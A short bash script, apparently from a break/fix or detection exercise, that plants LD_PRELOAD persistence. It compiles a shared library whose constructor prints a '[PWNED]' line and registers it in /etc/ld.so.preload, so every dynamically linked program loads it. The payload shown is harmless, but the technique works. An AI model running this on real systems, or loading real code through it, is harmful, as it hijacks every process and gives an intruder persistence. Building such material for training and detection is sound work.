#!/bin/bash
# BREAK: LD_PRELOAD persistence via /etc/ld.so.preload
# Effect: every dynamically linked binary loads evil.so before executing

cat > /tmp/evil.c << 'CSRC'
#include <stdio.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    fprintf(stderr, "[PWNED] library loaded by PID %d\n", getpid());
}
CSRC

gcc -shared -fPIC -o /lib/evil.so /tmp/evil.c
echo "/lib/evil.so" > /etc/ld.so.preload
echo "[BREAK] Persistence planted. Run any binary to confirm."
